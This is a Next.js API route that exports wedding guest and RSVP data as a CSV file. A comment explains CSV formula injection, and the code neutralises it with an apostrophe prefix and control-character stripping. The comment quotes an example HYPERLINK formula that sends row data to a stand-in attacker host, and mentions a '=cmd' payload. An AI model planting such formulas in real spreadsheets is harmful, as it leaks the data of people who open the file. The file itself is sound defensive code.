import { NextRequest, NextResponse } from "next/server";
import { auth, type SessionUser } from "@/lib/auth";
import { prisma } from "@/lib/db";

/**
 * One cell of CSV, safe to open in a spreadsheet.
 *
 * Quoting alone is not enough, and the gap is not about CSV parsing — it is
 * about what Excel, LibreOffice and Sheets do *after* parsing. A cell whose
 * value begins with `=`, `+`, `-`, `@` or a control character is treated as a
 * formula, quotes or not. `=HYPERLINK("https://evil.example?x="&A1,"Click")`
 * exfiltrates the row it sits in; older Excel builds will run `=cmd|…` outright,
 * with a dialog most people click through.
 *
 * Almost everything in this export is written by a guest — their name, their
 * dietary note, their free-text message — and it lands in a file the planner
 * opens without thinking. That is CSV injection (OWASP), and it is a route from
 * an unauthenticated stranger to code on a planner's laptop.
 *
 * The leading apostrophe is the standard neutraliser: every spreadsheet reads it
 * as "the rest is literal text", strips it on display, and no longer evaluates
 * the cell. Control characters go too — a bare CR or a tab can break a row apart
 * and shift values into the wrong columns.
 */
const csvCell = (v: string) => {
  const cleaned = v.replace(/[\u0000-\u001F\u007F]/g, " ");
  const neutral = /^[=+\-@]/.test(cleaned) ? `'${cleaned}` : cleaned;
  return `"${neutral.replace(/"/g, '""')}"`;
};

export async function GET(_req: NextRequest, ctx: { params: Promise<{ id: string }> }) {
  const session = await auth();
  const user = session?.user as SessionUser | undefined;
  if (!user || user.role !== "PLANNER" || !user.studioId) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }
  const { id } = await ctx.params;
  const wedding = await prisma.wedding.findFirst({ where: { id, studioId: user.studioId } });
  if (!wedding) return NextResponse.json({ error: "Not found" }, { status: 404 });

  const guests = await prisma.guest.findMany({
    where: { weddingId: wedding.id, studioId: user.studioId },
    orderBy: { createdAt: "asc" },
    include: { rsvp: true },
  });
  const header = ["Name", "Email", "Phone", "Groups", "Invite code", "Invited at", "RSVP", "Meal", "Dietary", "Notes"];
  const lines = guests.map(g => [
    g.name, g.email ?? "", g.phone ?? "", g.groups.join("|"), g.inviteCode,
    g.invitedAt?.toISOString() ?? "", g.rsvp?.status ?? "AWAITING",
    g.rsvp?.meal ?? "", g.rsvp?.dietary ?? "", g.rsvp?.notes ?? "",
  ].map(csvCell).join(","));
  const csv = [header.map(csvCell).join(","), ...lines].join("\n");

  return new NextResponse(csv, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="guests-${wedding.slug}.csv"`,
    },
  });
}
